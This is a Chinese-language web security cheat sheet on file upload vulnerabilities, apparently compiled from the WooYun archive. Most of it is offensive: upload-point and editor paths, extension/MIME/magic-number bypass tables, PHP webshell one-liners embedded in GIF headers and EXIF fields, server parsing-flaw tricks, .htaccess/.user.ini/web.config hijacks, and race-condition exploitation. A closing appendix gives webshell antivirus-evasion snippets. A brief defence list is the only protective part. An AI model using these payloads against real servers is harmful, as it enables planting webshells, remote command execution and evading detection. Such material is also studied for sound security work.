# Web 安全 - 文件上传漏洞

> 来源: WooYun 漏洞库 | 拆自 web-file-infra.md

## 一、文件上传漏洞

### 1.1 漏洞本质

```
攻击链: 上传点发现 → 检测绕过 → 路径获取 → 解析利用 → Webshell运行
成功率 = P(绕过检测) × P(获取路径) × P(解析运行)
```

核心矛盾: 功能需求(允许上传) vs 安全需求(限制执行)。大多数防御仅关注"绕过检测"，忽略路径泄露和解析配置。

### 1.2 上传点识别

| 上传点类型 | 频率 | 风险 | 典型路径 |
|-----------|------|------|---------|
| 富文本编辑器 | 42% | 极高 | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| 头像上传 | 18% | 高 | `/upload/avatar/`, `/member/uploadfile/` |
| 附件/文档 | 15% | 高 | `/uploads/`, `/attachment/` |
| 后台功能 | 12% | 极高 | `/admin/upload/`, `/system/upload/` |
| 导入功能 | 5% | 高 | `/import/`, `/excelUpload/` |

编辑器测试路径:

| 编辑器 | 测试路径 | 上传接口 |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 绕过技巧 - 扩展名

黑名单绕过速查表:

| 技巧 | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| 大小写 | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| 双写 | `.pphphp` | `.asaspp` | `.jsjspp` |
| 特殊后缀 | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| 空格/点 | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00截断 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| 分号(IIS) | N/A | `.asp;.jpg` | N/A |
| 换行(Apache) | `.php\x0a` | N/A | N/A |

白名单绕过方法:

| 技术 | 原理 | 条件 |
|-----|------|------|
| 解析漏洞 | 上传白名单文件但被特殊解析 | IIS/Apache/Nginx漏洞 |
| Apache多后缀 | `shell.php.jpg` 被解析为php | Apache多后缀配置 |
| %00截断 | `shell.php%00.jpg` | PHP < 5.3.4 |
| 配置文件上传 | 上传`.htaccess`/`.user.ini` | 允许txt/配置文件 |
| 图片马+LFI | 上传图片马配合文件包含 | 存在LFI漏洞 |

### 1.4 绕过技巧 - MIME/Content-Type

```
修改Content-Type为以下值即可绕过:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (通用)

Burp拦截修改示例:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- 关键修改点
```

### 1.5 绕过技巧 - 文件头/内容检测

常见文件Magic Number:

| 类型 | Magic Number(Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | 无可读ASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

图片马制作:

```bash
# 方法1: 简单添加文件头
GIF89a<?php system($_POST['cmd']); ?>

# 方法2: 合并文件
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# 方法3: EXIF注入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Web服务器解析漏洞

```
IIS 5.x/6.0:
  目录解析: /shell.asp/1.jpg     -> 解析为ASP
  文件解析: shell.asp;.jpg       -> 解析为ASP
  畸形解析: shell.asp.jpg        -> 可能解析为ASP

Apache:
  多后缀: shell.php.xxx          -> 从右向左解析
  .htaccess: AddType application/x-httpd-php .jpg
  换行解析: shell.php%0a         -> CVE-2017-15715

Nginx:
  畸形解析: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  空字节: shell.jpg%00.php       -> 老版本漏洞

Tomcat:
  PUT方法: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 配置文件劫持解析

```apache
# .htaccess: 让jpg被解析为PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): 自动包含图片马
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): 让jpg被FastCGI处理 -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 竞争条件利用

```
原理: 上传后删除存在时间差
利用: 多线程上传+访问,在删除前执行恶意代码
技巧: 恶意文件先生成一个新文件到其他位置,新文件不被清理机制删除
```

### 1.9 防御措施

1. 白名单验证: 只允许特定扩展名(`.jpg .png .gif .pdf`)
2. 多层验证: 扩展名 + MIME(finfo_file) + 文件头 + getimagesize()
3. 文件重命名: `uniqid() + 固定扩展名`，彻底去除原始文件名
4. 禁止执行: 上传目录禁止脚本执行权限
5. 权限最小化: `chmod 0644`，Web用户不可执行
6. 先检后存: 先验证再存储，使用原子操作防竞争条件
7. 路径隐藏: 不返回完整路径，使用CDN或随机化URL

---


---
## 附录: Webshell 免杀技巧速查

## 附录B: Webshell免杀技巧速查

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // 变量拼接
array_map('ass'.'ert', array($_POST['x']));            // 回调函数
$f = create_function('', $_POST['x']); $f();           // 动态函数
set_exception_handler('system');                        // 异常处理
throw new Exception($_POST['cmd']);
```

